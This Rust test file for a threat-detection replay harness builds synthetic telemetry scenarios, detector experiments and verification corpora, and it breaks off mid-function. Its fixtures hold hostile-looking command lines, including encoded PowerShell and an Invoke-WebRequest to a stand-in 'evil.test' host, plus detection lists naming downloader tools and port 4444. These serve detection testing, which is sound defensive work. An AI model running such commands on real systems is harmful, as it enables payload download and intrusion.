#![allow(clippy::unwrap_used, clippy::expect_used)]

use super::{
    DefaultReplayHarness, DetectorCandidateManifest, DetectorExperimentManifest,
    PromotionReviewRecommendation, ReplayEvaluationReport, ReplayRunBundle, ReplayScenarioClass,
    ReplayScenarioInput, ReplayScenarioManifest, ReplayScenarioMetadata, ReplayScenarioStep,
    ReplaySuiteManifest, ReplaySuiteMetadata, VerificationCorpusManifest,
    load_detector_experiment_manifest, load_scenario_manifest, load_verification_manifest,
    render_evaluation_report, render_experiment_report, render_promotion_review_packet,
    render_replay_run, render_shadow_report, render_suite_report, render_verification_report,
};
use serde_json::Value;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};
use swarm_core::ThreatClass;
use swarm_core::config::{PolicyActionSelector, PolicyRuleConfig, PolicyRuleDecision};
use swarm_core::types::{ResponseAction, Severity};
use swarm_whisker::{
    DetectionStrategy, NetworkConnectProfile, ProcessStartEvent, TelemetryEvent, TelemetryPayload,
};

fn permissive_policy_rules() -> Vec<PolicyRuleConfig> {
    use ThreatClass::{
        CommandAndControl, CredentialAccess, DataExfiltration, DefenseEvasion, Discovery,
        Execution, Impact, InitialAccess, LateralMovement, Persistence, PrivilegeEscalation,
        SupplyChain,
    };

    [
        Execution,
        CommandAndControl,
        CredentialAccess,
        DataExfiltration,
        DefenseEvasion,
        Discovery,
        Impact,
        InitialAccess,
        LateralMovement,
        Persistence,
        PrivilegeEscalation,
        SupplyChain,
    ]
    .into_iter()
    .map(|threat_class| PolicyRuleConfig {
        name: format!("replay-test-allow-{threat_class:?}"),
        decision: PolicyRuleDecision::Allow,
        threat_class,
        // Non-destructive selectors only. An empty `actions` list is a wildcard
        // that matches every action kind, including destructive ones, and a
        // matching rule decides outright -- so a wildcard here silently strips
        // the `static.human_gate` verdict these scenarios are written to assert.
        actions: vec![
            PolicyActionSelector::Escalate,
            PolicyActionSelector::DeployDecoy,
        ],
        min_severity: Severity::Low,
        max_severity: Severity::Critical,
        time_window_utc: None,
        max_actions_per_agent_per_minute: None,
        reason: Some("replay tests allow configured response actions".to_string()),
    })
    .collect()
}

fn sample_config() -> swarm_core::config::SwarmConfig {
    let mut config: swarm_core::config::SwarmConfig =
        serde_yaml::from_str(include_str!("../../../../rulesets/default.yaml")).unwrap();
    config.policy.rules = permissive_policy_rules();
    config
}

fn suspicious_event(
    event_id: &str,
    host_id: &str,
    user: &str,
    command_line: &str,
) -> TelemetryEvent {
    TelemetryEvent {
        source: "synthetic".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_000,
        host_id: Some(host_id.to_string()),
        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: "WINWORD".to_string(),
            process_name: "powershell".to_string(),
            command_line: command_line.to_string(),
            user: Some(user.to_string()),
            executable_path: None,
            signer: None,
            signature_valid: None,
        }),
    }
}

fn benign_event(event_id: &str) -> TelemetryEvent {
    TelemetryEvent {
        source: "synthetic".to_string(),
        event_id: event_id.to_string(),
        timestamp: 1_700_000_000_000,
        host_id: Some("host-benign".to_string()),
        payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
            parent_process: "launchd".to_string(),
            process_name: "ls".to_string(),
            command_line: "ls -la".to_string(),
            user: Some("alice".to_string()),
            executable_path: None,
            signer: None,
            signature_valid: None,
        }),
    }
}

fn scenario_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "office_dropper_correlation".to_string(),
        description: "Two suspicious office child processes should correlate".to_string(),
        seed_time_ms: 1_700_000_100_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec!["seed-receipt".to_string()],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Adversarial,
            threat_class: Some(ThreatClass::Execution),
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec!["T1204.002".to_string(), "T1059.001".to_string()],
            tags: vec!["office".to_string(), "correlation".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![
                ReplayScenarioStep {
                    action: ResponseAction::IsolateHost {
                        host_id: "host-ops-1".to_string(),
                    },
                    event: suspicious_event(
                        "hunt-evt-1",
                        "host-ops-1",
                        "alice",
                        "powershell.exe -enc AAA=",
                    ),
                },
                ReplayScenarioStep {
                    action: ResponseAction::BlockEgress {
                        target: "198.51.100.20".to_string(),
                    },
                    event: suspicious_event(
                        "hunt-evt-2",
                        "host-ops-1",
                        "alice",
                        "powershell.exe Invoke-WebRequest https://evil.test",
                    ),
                },
            ],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 2
investigation_count: 2
incident_count: 1
hunts:
  - hunt_id: hunt-evt-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
  - hunt_id: hunt-evt-2
    action_kind: block_egress
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-evt-1, hunt-evt-2]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn benign_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "benign_baseline".to_string(),
        description: "Benign process tree should not emit replay bundles".to_string(),
        seed_time_ms: 1_700_000_200_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec![],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Benign,
            threat_class: None,
            campaign: None,
            techniques: Vec::new(),
            tags: vec!["control".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::Escalate {
                    summary: "operator review".to_string(),
                    urgency: Severity::Medium,
                },
                event: benign_event("hunt-benign-1"),
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn python_benign_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "python_maintenance_benign".to_string(),
        description: "Python maintenance curl should remain benign".to_string(),
        seed_time_ms: 1_700_000_400_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec![],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Benign,
            threat_class: None,
            campaign: Some("operator_maintenance".to_string()),
            techniques: vec!["T1105".to_string()],
            tags: vec!["control".to_string(), "python".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::Escalate {
                    summary: "operator review".to_string(),
                    urgency: Severity::Medium,
                },
                event: TelemetryEvent {
                    source: "synthetic".to_string(),
                    event_id: "hunt-python-benign-1".to_string(),
                    timestamp: 1_700_000_000_400,
                    host_id: Some("host-python".to_string()),
                    payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                        parent_process: "python".to_string(),
                        process_name: "curl".to_string(),
                        command_line: "curl https://intranet.local/health".to_string(),
                        user: Some("svc-maintenance".to_string()),
                        executable_path: None,
                        signer: None,
                        signature_valid: None,
                    }),
                },
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 0
investigation_count: 0
incident_count: 0
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn pdf_lolbin_manifest() -> ReplayScenarioManifest {
    ReplayScenarioManifest {
        name: "pdf_lolbin_execution".to_string(),
        description: "PDF reader spawning cmd should be suspicious".to_string(),
        seed_time_ms: 1_700_000_300_000,
        requested_by: "replay-whisker".to_string(),
        receipt_chain: vec!["seed-receipt".to_string()],
        metadata: ReplayScenarioMetadata {
            class: ReplayScenarioClass::Adversarial,
            threat_class: Some(ThreatClass::Execution),
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec![
                "T1204.002".to_string(),
                "T1059.003".to_string(),
                "T1059.001".to_string(),
            ],
            tags: vec!["pdf".to_string(), "lolbin".to_string()],
        },
        input: ReplayScenarioInput::Events {
            events: vec![ReplayScenarioStep {
                action: ResponseAction::IsolateHost {
                    host_id: "host-pdf-1".to_string(),
                },
                event: TelemetryEvent {
                    source: "synthetic".to_string(),
                    event_id: "hunt-pdf-1".to_string(),
                    timestamp: 1_700_000_000_300,
                    host_id: Some("host-pdf-1".to_string()),
                    payload: TelemetryPayload::ProcessStart(ProcessStartEvent {
                        parent_process: "ACRORD32".to_string(),
                        process_name: "cmd".to_string(),
                        command_line: "cmd.exe /c powershell.exe -enc BBB=".to_string(),
                        user: Some("alice".to_string()),
                        executable_path: None,
                        signer: None,
                        signature_valid: None,
                    }),
                },
            }],
        },
        expectations: serde_yaml::from_str(
            r#"
replay_bundle_count: 1
investigation_count: 1
incident_count: 1
hunts:
  - hunt_id: hunt-pdf-1
    action_kind: isolate_host
    policy_verdict: require_human
    response_kind: success
incident_hunt_groups:
  - [hunt-pdf-1]
max_detect_latency_us: 5000
max_policy_latency_us: 5000
max_response_latency_us: 5000
"#,
        )
        .unwrap(),
    }
}

fn unique_temp_dir(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!(
        "swarm-runtime-replay-{label}-{}-{nanos}",
        std::process::id()
    ));
    fs::create_dir_all(&path).unwrap();
    path
}

fn write_scenario(root: &Path, name: &str, manifest: &ReplayScenarioManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_suite(root: &Path, name: &str, manifest: &ReplaySuiteManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_experiment(root: &Path, name: &str, manifest: &DetectorExperimentManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn write_verification(root: &Path, name: &str, manifest: &VerificationCorpusManifest) -> PathBuf {
    let path = root.join(name);
    fs::write(&path, serde_yaml::to_string(manifest).unwrap()).unwrap();
    path
}

fn replay_without_performance(bundle: &ReplayRunBundle) -> Value {
    serde_json::json!({
        "run_id": bundle.run_id,
        "scenario_name": bundle.scenario_name,
        "scenario_path": bundle.scenario_path,
        "metadata": bundle.metadata,
        "input_kind": bundle.input_kind,
        "seed_time_ms": bundle.seed_time_ms,
        "created_at_ms": bundle.created_at_ms,
        "requested_by": bundle.requested_by,
        "expectations": bundle.expectations,
        "replay_bundles": bundle.replay_bundles,
        "investigations": bundle.investigations,
        "incidents": bundle.incidents,
        "deterministic_summary": bundle.deterministic_summary,
    })
}

#[tokio::test]
async fn event_scenario_runs_deterministically_and_persists_result_bundle() {
    let root = unique_temp_dir("events");
    let results_dir = root.join("results");
    let scenario_path = write_scenario(&root, "office-dropper.yaml", &scenario_manifest());
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let first = harness.run_scenario_path(&scenario_path).await.unwrap();
    let second = harness.run_scenario_path(&scenario_path).await.unwrap();
    let loaded = harness
        .load_run("replay_run:office_dropper_correlation:1700000100000")
        .unwrap()
        .unwrap();

    assert_eq!(first.record.run_id, second.record.run_id);
    assert_eq!(
        replay_without_performance(&first.bundle),
        replay_without_performance(&second.bundle)
    );
    assert_eq!(loaded.record.run_id, first.record.run_id);
    assert_eq!(first.bundle.deterministic_summary.replay_bundle_count, 2);
    assert_eq!(first.bundle.deterministic_summary.investigation_count, 2);
    assert_eq!(first.bundle.deterministic_summary.incident_count, 1);
    assert!(render_replay_run(&first.bundle).contains("office_dropper_correlation"));

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn replay_bundle_fixtures_can_drive_offline_replay() {
    let root = unique_temp_dir("bundle-fixtures");
    let results_dir = root.join("results");
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let source_scenario_path = write_scenario(&root, "source.yaml", &scenario_manifest());
    let source_run = harness
        .run_scenario_path(&source_scenario_path)
        .await
        .unwrap();
    let fixture_path = root.join("fixture-bundle.json");
    fs::write(
        &fixture_path,
        serde_json::to_string_pretty(&source_run.bundle.replay_bundles[0]).unwrap(),
    )
    .unwrap();

    let bundle_manifest = serde_yaml::from_str::<ReplayScenarioManifest>(&format!(
        r#"
name: persisted_bundle_fixture
description: Persisted replay bundles can be re-run offline
seed_time_ms: 1700000300000
requested_by: replay-whisker
metadata:
  class: adversarial
input:
  kind: replay_bundles
  paths:
    - {}
expectations:
  replay_bundle_count: 1
  investigation_count: 1
  incident_count: 1
  hunts:
    - hunt_id: hunt-evt-1
      action_kind: isolate_host
      policy_verdict: require_human
      response_kind: success
  incident_hunt_groups:
    - [hunt-evt-1]
"#,
        fixture_path.display()
    ))
    .unwrap();
    let bundle_scenario_path = write_scenario(&root, "bundle-source.yaml", &bundle_manifest);

    let replay_from_bundle = harness
        .run_scenario_path(&bundle_scenario_path)
        .await
        .unwrap();
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .replay_bundle_count,
        1
    );
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .investigation_count,
        1
    );
    assert_eq!(
        replay_from_bundle
            .bundle
            .deterministic_summary
            .incident_count,
        1
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn evaluation_report_passes_expected_scenario_and_flags_regressions() {
    let root = unique_temp_dir("evaluation");
    let results_dir = root.join("results");
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    let passing_path = write_scenario(&root, "passing.yaml", &scenario_manifest());
    let passing_report = harness.evaluate_scenario_path(&passing_path).await.unwrap();
    assert!(passing_report.passed);
    assert!(render_evaluation_report(&passing_report).contains("Status: pass"));

    let failing_path = write_scenario(&root, "failing.yaml", &benign_manifest());
    let failing_report: ReplayEvaluationReport =
        harness.evaluate_scenario_path(&failing_path).await.unwrap();
    assert!(failing_report.passed);

    let mut mismatched = scenario_manifest();
    mismatched.expectations.max_detect_latency_us = Some(0);
    let mismatched_path = write_scenario(&root, "mismatched.yaml", &mismatched);
    let regression_report = harness
        .evaluate_scenario_path(&mismatched_path)
        .await
        .unwrap();
    assert!(!regression_report.passed);
    assert!(
        regression_report
            .checks
            .iter()
            .any(|check| check.name == "max_detect_latency_us" && !check.passed)
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn tracked_repo_scenarios_pass_expectation_gates() {
    let results_dir = unique_temp_dir("repo-scenarios");
    let config_path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rulesets/default.yaml");
    let scenarios_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scenarios");
    let filtered_dir = results_dir.join("default-strategy-scenarios");
    fs::create_dir_all(&filtered_dir).unwrap();
    for scenario in [
        "benign-baseline.yaml",
        "office-dropper-correlation.yaml",
        "pdf-lolbin-execution.yaml",
        "python-maintenance-benign.yaml",
        "scripting-encoded-powershell.yaml",
    ] {
        fs::copy(scenarios_dir.join(scenario), filtered_dir.join(scenario)).unwrap();
    }
    let harness = DefaultReplayHarness::from_path(&config_path, &results_dir).unwrap();

    let suite = harness.evaluate_scenarios_dir(&filtered_dir).await.unwrap();

    assert!(suite.passed);
    assert_eq!(suite.total_scenarios, 5);
    assert!(render_suite_report(&suite).contains("Replay Suite"));

    let _ = fs::remove_dir_all(results_dir);
}

#[tokio::test]
async fn named_suite_manifest_runs_with_metadata_and_technique_groups() {
    let root = unique_temp_dir("suite-manifest");
    let results_dir = root.join("results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let pdf_path = write_scenario(
        &scenarios_dir,
        "pdf-lolbin-execution.yaml",
        &pdf_lolbin_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );

    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                pdf_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let suite = harness.evaluate_suite_path(&suite_path).await.unwrap();

    assert!(suite.passed);
    assert_eq!(suite.total_scenarios, 3);
    assert_eq!(
        suite.source_kind,
        super::ReplaySuiteSourceKind::SuiteManifest
    );
    assert!(
        suite
            .technique_groups
            .iter()
            .any(|group| group.technique == "T1204.002")
    );
    assert!(render_suite_report(&suite).contains("hellcat_office_v1"));

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn experiment_report_persists_and_flags_false_positive_regression() {
    let root = unique_temp_dir("experiment");
    let results_dir = root.join("results");
    let experiments_dir = root.join("experiments-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verifications_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verifications_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verifications_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );

    let experiment_path = write_experiment(
        &experiments_src_dir,
        "python-parent-broadening.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: python_parent_broadening
description: broaden suspicious parents to python
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: python_parent_broadening
  description: add python to suspicious parents
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
      - python
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: broaden suspicious parent set with python
  rationale: explore downloader coverage
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display()
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_experiment_path(&experiment_path, &experiments_dir)
        .await
        .unwrap();

    assert!(!lookup.report.passed);
    assert!(
        lookup
            .report
            .comparison
            .scenario_regressions
            .iter()
            .any(|regression| regression.reason.contains("false positive"))
    );
    assert!(
        lookup
            .report
            .gates
            .iter()
            .any(|gate| gate.name == "false_positive_delta" && !gate.passed)
    );
    assert!(render_experiment_report(&lookup.report).contains("Detector Experiment"));
    let reloaded = harness
        .load_experiment(&experiments_dir, &lookup.record.experiment_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.experiment_id, lookup.record.experiment_id);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn replay_manifest_and_switchboard_accept_network_connect() -> Result<(), Box<dyn std::error::Error>>
{
    let root = unique_temp_dir("network-connect-manifest");
    let experiments_dir = root.join("experiments");
    fs::create_dir_all(&experiments_dir)?;

    let mut config = sample_config();
    config.detection.strategy = "network_connect".to_string();
    config.detection.profiles.network_connect = Some(serde_json::json!({
        "suspicious_ports": [4444],
    }));
    let baseline = super::replay_detector(&config)?;
    assert_eq!(baseline.id(), "network_connect");

    let manifest = DetectorExperimentManifest {
        name: "network-connect-candidate".to_string(),
        description: "network connect replay candidate".to_string(),
        corpus: super::ExperimentCorpusTarget {
            suite: "../scenario-suites/hellcat-office-v1.yaml".to_string(),
        },
        verification: super::ExperimentVerificationTarget {
            corpus: "../verifications/office-detector-safety-v1.yaml".to_string(),
        },
        candidate: DetectorCandidateManifest::NetworkConnect {
            strategy_id: "network_connect_candidate".to_string(),
            description: "network connect candidate".to_string(),
            profile: NetworkConnectProfile {
                suspicious_ports: vec![4444],
                ..NetworkConnectProfile::default()
            },
        },
        lineage: super::ExperimentLineage {
            parent_strategy_id: "network_connect".to_string(),
            mutation: "test".to_string(),
            rationale: "test".to_string(),
        },
        gates: Default::default(),
    };
    let manifest_path = write_experiment(
        &experiments_dir,
        "network-connect-candidate.yaml",
        &manifest,
    );

    let loaded = load_detector_experiment_manifest(&manifest_path)?;
    assert_eq!(loaded.candidate.strategy_id(), "network_connect_candidate");
    let candidate = super::detector_from_candidate(&loaded.candidate)?;
    assert_eq!(candidate.id(), "network_connect_candidate");

    let _ = fs::remove_dir_all(root);
    Ok(())
}

#[tokio::test]
async fn verification_report_persists_and_flags_false_positive_counterexample() {
    let root = unique_temp_dir("verification-report");
    let results_dir = root.join("results");
    let verifications_dir = root.join("verification-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.0
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "python-parent-broadening.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: python_parent_broadening
description: broaden suspicious parents to python
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: python_parent_broadening
  description: add python to suspicious parents
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
      - python
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: broaden suspicious parent set with python
  rationale: explore downloader coverage
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_verification_path(&experiment_path, &verifications_dir)
        .await
        .unwrap();

    assert!(!lookup.report.passed);
    assert!(
        lookup
            .report
            .invariants
            .iter()
            .any(|invariant| invariant.name == "false_positive_bound" && !invariant.passed)
    );
    assert!(render_verification_report(&lookup.report).contains("Detector Verification"));
    let reloaded = harness
        .load_verification(&verifications_dir, &lookup.record.verification_id)
        .unwrap()
        .unwrap();
    assert_eq!(
        reloaded.record.verification_id,
        lookup.record.verification_id
    );

    let _ = fs::remove_dir_all(root);
}

/// Builds a verification whose known-bad suite contains one adversarial
/// scenario that IS detected plus one extra scenario supplied verbatim as
/// YAML, and whose benign controls are a single clean scenario. Every other
/// invariant is arranged to pass, so the verdict this returns is a statement
/// about the extra scenario and nothing else.
async fn verification_over_extra_scenario_yaml(
    label: &str,
    extra_file_name: &str,
    extra_scenario_yaml: &str,
) -> (
    PathBuf,
    Result<super::DetectorVerificationLookup, super::ReplayHarnessError>,
) {
    let root = unique_temp_dir(label);
    let results_dir = root.join("results");
    let verifications_dir = root.join("verification-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(&scenarios_dir, "benign-baseline.yaml", &benign_manifest());
    let extra_path = scenarios_dir.join(extra_file_name);
    fs::write(&extra_path, extra_scenario_yaml).unwrap();

    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                extra_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "office-baseline-control.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: office_baseline_control
description: control candidate mirroring the production detector
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: office_baseline_control
  description: candidate profile matches the production suspicious process-tree detector
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: control
  rationale: establish a no-drift baseline
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let outcome = harness
        .evaluate_verification_path(&experiment_path, &verifications_dir)
        .await;
    (root, outcome)
}

/// Asserts the verification did not reach a verdict *without looking at* the
/// named scenario. Either the manifest was refused outright, or it appears as
/// the counterexample of an invariant that failed. A `passed: true` report, or
/// a failure that never names the scenario, both mean the scenario slipped
/// past every check -- which is the vacuity this exists to forbid.
fn assert_scenario_was_not_silently_exempt(
    outcome: Result<super::DetectorVerificationLookup, super::ReplayHarnessError>,
    scenario_name: &str,
    scenario_file_stem: &str,
) {
    match outcome {
        Err(error) => {
            let rendered = error.to_string();
            assert!(
                rendered.contains(scenario_file_stem) || rendered.contains("class"),
                "rejection must name the offending scenario or the missing class, got: {rendered}"
            );
        }
        Ok(lookup) => {
            assert!(
                !lookup.report.passed,
                "verification passed while `{scenario_name}` was subject to no invariant at all: {:#?}",
                lookup.report.invariants
            );
            let subject_of_a_failed_invariant = lookup
                .report
                .invariants
                .iter()
                .filter(|invariant| !invariant.passed)
                .flat_map(|invariant| invariant.counterexamples.iter())
                .any(|counterexample| {
                    counterexample.subject == scenario_name
                        || counterexample.reference.contains(scenario_file_stem)
                });
            assert!(
